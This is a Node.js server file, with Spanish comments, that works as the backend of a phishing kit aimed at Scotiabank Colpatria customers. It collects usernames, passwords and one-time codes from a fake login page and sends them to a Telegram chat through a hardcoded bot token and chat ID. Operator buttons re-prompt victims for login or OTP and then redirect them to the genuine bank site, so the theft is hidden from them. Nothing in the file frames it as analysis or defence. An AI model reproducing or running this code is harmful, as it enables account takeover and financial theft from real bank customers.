const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Configuración de Telegram
const TELEGRAM_TOKEN = '8535170486:AAFUkxrzSp3Hl_-XX7fs3MX3CYF6GNj2ikw';
const CHAT_ID = '-5065884514';
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: _POLL_TG });

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Socket.IO
io.on('connection', (socket) => {
    console.log('Cliente conectado');

    // Manejar envío de credenciales
    socket.on('sendCredentials', async (data) => {
        try {
            const message = `🔐 *NUEVO LOGIN*\n\n👤 *Usuario:* ${data.username}\n🔒 *Contraseña:* ${data.password}\n⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🔄 Pedir Login', callback_data: 'request_login' }
                    ],
                    [
                        { text: '📱 Pedir OTP', callback_data: 'request_otp' }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: 'finalize' }
                    ]
                ]
            };

            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            socket.emit('credentialsSent', { success: true });
        } catch (error) {
            console.error('Error al enviar a Telegram:', error);
            socket.emit('credentialsSent', { success: false, error: error.message });
        }
    });

    // Manejar envío de OTP
    socket.on('sendOTP', async (data) => {
        try {
            const message = `📱 *NUEVO OTP*\n\n👤 *Usuario:* ${data.username}\n🔒 *Contraseña:* ${data.password}\n🔢 *Código OTP:* ${data.otp}\n⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '📱 Pedir OTP Nuevamente', callback_data: 'request_otp' }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: 'finalize' }
                    ]
                ]
            };

            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });

            socket.emit('otpSent', { success: true });
        } catch (error) {
            console.error('Error al enviar OTP a Telegram:', error);
            socket.emit('otpSent', { success: false, error: error.message });
        }
    });

    socket.on('disconnect', () => {
        console.log('Cliente desconectado');
    });
});

// Manejar callbacks de Telegram
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === 'request_login') {
        await bot.answerCallbackQuery(query.id, { text: 'Redirigiendo a página de login...' });
        io.emit('redirectTo', 'index.html');
    } else if (data === 'request_otp') {
        await bot.answerCallbackQuery(query.id, { text: 'Redirigiendo a página de OTP...' });
        io.emit('redirectTo', 'otp.html');
    } else if (data === 'finalize') {
        await bot.answerCallbackQuery(query.id, { text: 'Finalizando sesión...' });
        io.emit('redirectTo', 'https://www.digital.scotiabankcolpatria.com/rob/ahorros?gclsrc=aw.ds&gad_source=1&gad_campaignid=19641034273&gbraid=0AAAAADKoFGSlivHkU-WWeqVLLVvhfLJaF');
    }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
    console.log('Bot de Telegram configurado correctamente');
});
